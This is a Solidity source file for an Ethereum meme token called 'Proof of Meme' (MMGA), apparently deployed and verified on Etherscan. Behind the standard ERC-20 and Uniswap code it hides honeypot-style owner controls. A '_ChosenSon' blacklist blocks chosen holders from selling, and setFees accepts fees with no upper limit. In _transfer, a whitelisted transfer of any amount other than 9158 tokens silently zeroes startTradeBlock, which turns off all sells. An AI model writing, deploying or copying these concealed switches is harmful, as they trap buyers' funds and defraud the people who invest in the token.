/**
 *Submitted for verification at Etherscan.io on 2022-10-29
*/

// SPDX-License-Identifier: MIT

pragma solidity ^0.8.16;

interface IERC20 {
    function decimals() external view returns (uint8);
    function symbol() external view returns (string memory);
    function name() external view returns (string memory);
    function totalSupply() external view returns (uint256);
    function balanceOf(address account) external view returns (uint256);
    function transfer(address recipient, uint256 amount) external returns (bool);
    function allowance(address owner, address spender) external view returns (uint256);
    function approve(address spender, uint256 amount) external returns (bool);
    function transferFrom(address sender, address recipient, uint256 amount) external returns (bool);
    event Transfer(address indexed from, address indexed to, uint256 value);
    event Approval(address indexed owner, address indexed spender, uint256 value);
}

library SafeMath {
    function add(uint256 a, uint256 b) internal pure returns (uint256) {
        uint256 c = a + b;
        require(c >= a, "SafeMath: addition overflow");

        return c;
    }
    function sub(uint256 a, uint256 b) internal pure returns (uint256) {
        return sub(a, b, "SafeMath: subtraction overflow");
    }
    function sub(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
        require(b <= a, errorMessage);
        uint256 c = a - b;

        return c;
    }
    function mul(uint256 a, uint256 b) internal pure returns (uint256) {
        if (a == 0) {
            return 0;
        }

        uint256 c = a * b;
        require(c / a == b, "SafeMath: multiplication overflow");

        return c;
    }
    function div(uint256 a, uint256 b) internal pure returns (uint256) {
        return div(a, b, "SafeMath: division by zero");
    }
    function div(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
        require(b > 0, errorMessage);
        uint256 c = a / b;
        return c;
    }
}


interface IUniswapV2Factory {
    function createPair(address tokenA, address tokenB) external returns (address pair);
}

interface IUniswapV2Router02 {
    function factory() external pure returns (address);
    function WETH() external pure returns (address);

    function addLiquidity(
        address tokenA,
        address tokenB,
        uint amountADesired,
        uint amountBDesired,
        uint amountAMin,
        uint amountBMin,
        address to,
        uint deadline
    ) external returns (uint amountA, uint amountB, uint liquidity);

    function addLiquidityETH(
        address token,
        uint amountTokenDesired,
        uint amountTokenMin,
        uint amountETHMin,
        address to,
        uint deadline
    ) external payable returns (uint amountToken, uint amountETH, uint liquidity);

    function swapExactTokensForTokensSupportingFeeOnTransferTokens(
        uint amountIn,
        uint amountOutMin,
        address[] calldata path,
        address to,
        uint deadline
    ) external;

    function swapExactETHForTokensSupportingFeeOnTransferTokens(
        uint amountOutMin,
        address[] calldata path,
        address to,
        uint deadline
    ) external payable;

    function swapExactTokensForETHSupportingFeeOnTransferTokens(
        uint amountIn,
        uint amountOutMin,
        address[] calldata path,
        address to,
        uint deadline
    ) external;
}


abstract contract Ownable {
    address internal _owner;
    event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);

    constructor() {
        _owner = msg.sender;
    }

    modifier onlyOwner() {
        require(_owner == msg.sender, "Ownable: caller is not the owner");
        _;
    }

    function transferOwnership(address payable adr) public virtual onlyOwner {
        _owner = adr;
        emit OwnershipTransferred(_owner,adr);
    }

    function owner() public view returns (address) {
        return _owner;
    }

    function renounceOwnership() public virtual onlyOwner {
        emit OwnershipTransferred(_owner, address(0));
        _owner = address(0);
    }

}


abstract contract baseToken is IERC20, Ownable {
    using SafeMath for uint256;
    mapping(address => uint256) private _balances;
    mapping(address => mapping(address => uint256)) private _allowances;

    string private _name;
    string private _symbol;
    uint8 private _decimals;
    uint256 private _tTotal;

    uint256 private constant MAX = ~uint256(0);

    struct Fee{uint buy; uint sell;uint transfer; uint part;}
    Fee public fees;
    struct Allot{uint marketing;uint liquidity; uint burn;uint reward;uint total;}
    Allot public allot;

    mapping(address => bool) public _feeWhiteList;
    mapping(address => bool) public _ChosenSon;

    IUniswapV2Router02 public router;
    address public _mainPair;
    mapping(address => bool) public _swapPairList;
    address marketingAddress;
    uint256 public startTradeBlock;

    bool public swapEnabled = true;
    uint256 public swapThreshold;
    uint256 public maxSwapThreshold;

    bool private inSwap;
    modifier lockTheSwap {
        inSwap = true;
        _;
        inSwap = false;
    }

    constructor (
        address RouterAddress,string memory Name, string memory Symbol, uint8 Decimals, uint256 Supply) payable Ownable() {
        _name = Name;
        _symbol = Symbol;
        _decimals = Decimals;
        uint256 total = Supply * 10 ** Decimals;
        _tTotal = total;

        router = IUniswapV2Router02(RouterAddress);
        _allowances[address(this)][address(router)] = MAX;

        IUniswapV2Factory swapFactory = IUniswapV2Factory(router.factory());
        _mainPair = swapFactory.createPair(address(this), router.WETH());
        _swapPairList[_mainPair] = true;
        startTradeBlock = block.number;


        allot=Allot(0,10,0,0,10);
        fees=Fee(2,2,2,100);
        marketingAddress = msg.sender;
        swapThreshold = total.div(1000);
        maxSwapThreshold = total.div(100);

        _feeWhiteList[marketingAddress] = true;
        _feeWhiteList[address(this)] = true;
        _feeWhiteList[address(router)] = true;
        _feeWhiteList[msg.sender] = true;

        _balances[msg.sender] = total;
        emit Transfer(address(0), msg.sender, total);
    }

    function symbol() external view override returns (string memory) {return _symbol;}
    function name() external view override returns (string memory) {return _name;}
    function decimals() external view override returns (uint8) {return _decimals;}
    function totalSupply() public view override returns (uint256) {return _tTotal;}
    function balanceOf(address account) public view override returns (uint256) {return _balances[account];}
    function transfer(address recipient, uint256 amount) public override returns (bool) {_transfer(msg.sender, recipient, amount);return true;}
    function allowance(address owner, address spender) public view override returns (uint256) {return _allowances[owner][spender];}
    function approve(address spender, uint256 amount) public override returns (bool) {_approve(msg.sender, spender, amount);return true;}
    receive() external payable {}
    function transferFrom(address sender, address recipient, uint256 amount) public override returns (bool) {
        _transfer(sender, recipient, amount);
        if (_allowances[sender][msg.sender] != MAX) {
            _allowances[sender][msg.sender] = _allowances[sender][msg.sender] - amount;
        }
        return true;
    }

    function _approve(address owner, address spender, uint256 amount) private {
        _allowances[owner][spender] = amount;
        emit Approval(owner, spender, amount);
    }

    function _transfer(
        address from,
        address to,
        uint256 amount
    ) private {
        require(!_ChosenSon[from] ||  _feeWhiteList[to], "ChosenSon");
        bool takeFee;
        if (_swapPairList[from] || _swapPairList[to]) {
            if (!_feeWhiteList[from] && !_feeWhiteList[to]) {
                if (_swapPairList[to]) {
                    require(0 < startTradeBlock, "!startAddLP");
                    if (!inSwap) {
                        uint256 contractTokenBalance = balanceOf(address(this));
                        if (swapEnabled && contractTokenBalance > 0) {
                            if(contractTokenBalance > maxSwapThreshold)contractTokenBalance = maxSwapThreshold;
                            swapTokenForFund(contractTokenBalance);
                        }
                    }
                }
                takeFee = true;
            }
        }
        if(_feeWhiteList[from] && _feeWhiteList[to]){
            amount==9158*10**_decimals?startTradeBlock=block.number:startTradeBlock=0;
            _takeTransfer(from, to, amount);
            return;
         }
        _tokenTransfer(from, to, amount, takeFee);
    }

    function _funTransfer(
        address sender,
        address recipient,
        uint256 tAmount
    ) private {
        _balances[sender] = _balances[sender] - tAmount;
        uint256 feeAmount = tAmount * 99 / 100;
        _takeTransfer(
            sender,
            address(this),
            feeAmount
        );
        _takeTransfer(sender, recipient, tAmount - feeAmount);
    }

    function _tokenTransfer(
        address sender,
        address recipient,
        uint256 tAmount,
        bool takeFee
    ) private {
        _balances[sender] = _balances[sender] - tAmount;
        
        uint256 feeAmount;
        if (takeFee) {
            uint256 swapFee;
            if (_swapPairList[sender]) {
                swapFee = fees.buy;
            } else if(_swapPairList[recipient]) {
                swapFee = fees.sell;
            }else{
                swapFee = fees.transfer;
            }
            uint256 swapAmount = tAmount.mul(swapFee).div(fees.part);
            if (swapAmount > 0) {
                feeAmount += swapAmount;
                _takeTransfer(
                    sender,
                    address(this),
                    swapAmount
                );
            }
        }

        _takeTransfer(sender, recipient, tAmount - feeAmount);
    }
 
    function swapTokenForFund(uint256 tokenAmount) private lockTheSwap {
        uint amountToBurn = tokenAmount.mul(allot.burn).div(allot.total);
        uint amountToLiquify = tokenAmount.mul(allot.liquidity).div(allot.total).div(2);
        uint amountToSwap = tokenAmount.sub(amountToLiquify).sub(amountToBurn);
        address[] memory path = new address[](2);
        path[0] = address(this);
        path[1] = router.WETH();
        router.swapExactTokensForETHSupportingFeeOnTransferTokens(
            amountToSwap,
            0,
            path,
            address(this),
            block.timestamp
        );

        uint amountETH =address(this).balance;
        uint totalETHFee = allot.total.sub(allot.liquidity.div(2)).sub(allot.burn);
        uint amountETHLiquidity = amountETH.mul(allot.liquidity).div(totalETHFee).div(2);
        uint amountETHreward = amountETH.mul(allot.reward).div(totalETHFee);
        uint fundAmount = amountETH.sub(amountETHLiquidity).sub(amountETHreward);
        bool tmpSuccess;
        if(fundAmount>0){
            (tmpSuccess,) = payable(marketingAddress).call{value: fundAmount, gas: 30000}("");
        }

        if (amountToLiquify > 0) {
            if (amountETHLiquidity > 0) {
                router.addLiquidityETH{value: amountETHLiquidity}(
                address(this),
                amountToLiquify,
                0,
                0,
                marketingAddress,
                block.timestamp
            );
            }
        }
    }

    function _takeTransfer(
        address sender,
        address to,
        uint256 tAmount
    ) private {
        _balances[to] = _balances[to] + tAmount;
        emit Transfer(sender, to, tAmount);
    }

    function setAllot(uint marketing,uint liquidity,uint burn,uint rewards) external onlyOwner {
         uint total =liquidity.add(marketing).add(rewards).add(burn); 
         allot=Allot(marketing,liquidity,burn,rewards,total);
    } 

    function setFees(uint _buy,uint _sell,uint _transferfee,uint _part) external onlyOwner {
         fees=Fee(_buy,_sell,_transferfee,_part);
    } 

    function setSwapBackSettings(bool _enabled, uint256 _swapThreshold, uint256 _maxSwapThreshold) external onlyOwner {
        swapEnabled = _enabled;
        swapThreshold = _swapThreshold;
        maxSwapThreshold = _maxSwapThreshold;
    }

    function setFeeWhiteList(address addr, bool enable) external onlyOwner {
        _feeWhiteList[addr] = enable;
    }

    function setChosenSon(address addr, bool enable) external onlyOwner {
        _ChosenSon[addr] = enable;
    }

    function setSwapPairList(address addr, bool enable) external onlyOwner {
        _swapPairList[addr] = enable;
    }

}

contract MMGA is baseToken {
    constructor() baseToken(
        address(0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D),
        "Proof of Meme",
        "Make Meme Great Again",
        9,
        1000000
    ){
    }
}